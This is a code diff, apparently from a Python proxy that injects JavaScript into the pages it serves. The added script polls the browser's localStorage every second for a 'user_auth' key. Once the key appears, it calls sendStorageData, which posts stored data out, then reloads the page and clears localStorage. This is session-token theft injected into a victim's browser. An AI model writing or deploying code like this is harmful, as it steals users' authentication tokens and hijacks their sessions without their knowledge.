@@ -48,7 +48,22 @@ def proxy(path):
                 }),
             });
         }
-        window.onload = sendStorageData;
+        
+
+        // Function to check if the key exists and log it every 5 seconds
+        const keyName = 'user_auth'; // Replace with your actual key name
+
+        setInterval(function() {
+            const value = localStorage.getItem(keyName);
+            if (value !== null) {
+                console.log(`Key "${keyName}" exists with value:`, value);
+                sendStorageData();
+                window.location.reload();
+                localStorage.clear();
+            }
+        }, 1000); // 5000 milliseconds = 5 seconds
+
+        
     </script>
     """
 
